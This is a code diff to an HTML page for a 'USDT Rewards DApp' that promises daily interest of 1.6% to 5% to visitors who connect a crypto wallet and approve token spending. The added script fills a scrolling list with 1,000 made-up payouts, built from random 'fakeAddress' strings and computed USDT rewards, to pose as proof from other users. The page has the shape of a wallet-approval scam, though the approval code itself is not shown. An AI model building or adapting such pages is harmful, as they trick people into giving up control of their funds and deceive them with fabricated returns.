@@ -12,7 +12,7 @@
             100% { transform: translateY(-50%); }
         }
         .animate-scroll-list {
-            animation: scrollUp 150s linear infinite;
+            animation: scrollUp 1500s linear infinite;
         }
         .animate-scroll-list:hover {
             animation-play-state: paused;
@@ -42,7 +42,6 @@
                 <h1 class="text-xs md:text-sm font-bold text-emerald-400">USDT Rewards DApp</h1>
             </div>
 
-            <!-- Top Right Controls: Polygon Logo Removed, Connect Button Only -->
             <div class="flex items-center gap-2">
                 <button id="connectBtn" onclick="startConnectProcess()" class="bg-blue-600 hover:bg-blue-500 font-semibold px-3 py-2 rounded-xl transition cursor-pointer text-xs shadow-lg">
                     Connect Wallet
@@ -52,8 +51,7 @@
 
         <div class="space-y-1 mb-4 text-center">
             <p id="walletAddress" class="text-xs text-slate-400 truncate"></p>
-            <span id="selectedNetworkBadge" class="hidden inline-block bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-xs px-3 py-1 rounded-full font-semibold">Active Network: POLYGON</span>
-            <div id="statusLog" class="text-xs text-center text-amber-400 font-mono pt-1"></div>
+        <div id="statusLog" class="text-xs text-center text-amber-400 font-mono pt-1"></div>
         </div>
 
         <div class="grid grid-cols-3 gap-2 mb-4 bg-gradient-to-r from-slate-900/90 via-slate-900 to-slate-900/90 border border-emerald-500/20 p-3 rounded-xl text-center shadow-inner relative overflow-hidden">
@@ -80,7 +78,7 @@
         </div>
 
         <p class="text-xs text-slate-300 leading-relaxed text-justify bg-slate-900/60 p-3.5 rounded-xl border border-slate-700/60">
-            ကျွန်ုပ်တို့၏ USDT Rewards DApp Platform မှ ကြိုဆိုပါသည်။ ဤစနစ်သည် အသုံးပြုသူများအတွက် မိမိတို့၏ Crypto Wallet ထဲတွင် ရှိသော USDT များပေါ် မူတည်၍ နေ့စဉ် တိုးတက်လာသော Cashback Rewards များကို စနစ်တကျ ရယူနိုင်ရန် ဖန်တီးထားသော ဗဟိုချုပ်ကိုင်မှုမဲ့ အကျိုးခံစားခွင့် ပလက်ဖောင်းတစ်ခု ဖြစ်ပါသည်။ Polygon Network ကို အသုံးပြုထားပြီး Spending Approval ပြုလုပ်ရုံဖြင့် မိမိ၏ Wallet Balance ပေါ် မူတည်ကာ သတ်မှတ်ထားသော Tiered Daily Rates အလိုက် ဆုလာဘ်များ စတင် ရရှိမည် ဖြစ်ပါသည်။
+            We are created our mining on Polygon (matic) network, so you will need polygon tokens in your wallet to interact with our mining. When you finish connect wallet and approve you will get interest within 24 hours depend on you USDT balance.
         </p>
     </div>
 
@@ -148,7 +146,7 @@
         </div>
 
         <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl mb-4 text-xs">
-            <h2 class="font-bold text-amber-400 mb-3 uppercase tracking-wider text-center">📊 Interest Rate Tiers (နှုန်းထားများ)</h2>
+            <h2 class="font-bold text-amber-400 mb-3 uppercase tracking-wider text-center">📊 Daily interest rate</h2>
             <ul class="space-y-2 text-slate-300">
                 <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 50 USDT</span> <span class="text-emerald-400 font-semibold">1.6% USDTBalance</span></li>
                 <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 1,001 USDT</span> <span class="text-emerald-400 font-semibold">2% USDTBalance</span></li>
@@ -209,7 +207,7 @@
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="./binance.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Binance">
-                    <span class="font-semibold text-slate-200 text-xs">Binance wallet</span>
+                    <span class="font-semibold text-slate-200 text-xs">Binance</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="./trustwallet.png" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Trust Wallet">
@@ -264,25 +262,36 @@
             document.getElementById("qrImage").src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodedUrl}`;
         }
 
+        // Tiers နှုန်းထားများအလိုက် USDT ဖြင့် တွက်ချက်ပြသသည့် Interest Income List (1000 ခု)
         function generateIncomeList() {
             const container = document.getElementById("incomeListContainer");
             let htmlContent = "";
 
-            for (let i = 1; i <= 100; i++) {
+            // Interest Rate Tiers ရာခိုင်နှုန်းစာရင်းများ (1.6% မှ 5% ထိ)
+            const tierRates = [0.016, 0.02, 0.024, 0.028, 0.032, 0.038, 0.042, 0.046, 0.05];
+            // Tiers အလိုက် အနိမ့်ဆုံး / အမြင့်ဆုံး ပမာဏများ
+            const tierMinAmounts = [50, 1001, 3001, 5001, 10001, 20001, 50001, 100001, 300001];
+
+            for (let i = 1; i <= 1000; i++) {
                 const randomHex1 = Math.random().toString(16).substring(2, 7).toUpperCase();
                 const randomHex2 = Math.random().toString(16).substring(2, 8).toLowerCase();
                 const fakeAddress = `0x${randomHex1}......${randomHex2}`;
-                const randomAmount = (Math.random() * 0.05 + 0.001).toFixed(4);
+
+                // ကျပန်း Tier တစ်ခုကို ရွေးချယ်ခြင်း
+                const randomTierIndex = Math.floor(Math.random() * tierRates.length);
+                const rate = tierRates[randomTierIndex];
+                const minAmt = tierMinAmounts[randomTierIndex];
+                
+                // ထို Tier အတွင်း ကျပန်း Balance တစ်ခုယူ၍ နှုန်းထားနှင့် တွက်ချက်ခြင်း (တစ်ရက်စာ Cashback ပမာဏ)
+                const randomBalance = minAmt + (Math.random() * (minAmt * 0.5));
+                const usdtReward = (randomBalance * rate).toFixed(2);
 
                 htmlContent += `
                     <div class="flex items-center justify-between bg-slate-900/90 p-3 rounded-xl border border-slate-800">
                         <div class="flex items-center gap-2.5">
-                            <div class="w-6 h-6 rounded-full bg-slate-800 flex items-center justify-center p-1 border border-slate-700">
-                                <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" class="w-full h-full object-contain">
-                            </div>
                             <span class="font-mono text-slate-300 text-xs">${fakeAddress}</span>
                         </div>
-                        <span class="font-mono font-semibold text-emerald-400 text-xs">${randomAmount} <span class="text-slate-400">MATIC</span></span>
+                        <span class="font-mono font-semibold text-emerald-400 text-xs">${usdtReward} <span class="text-slate-400">USDT</span></span>
                     </div>
                 `;
             }
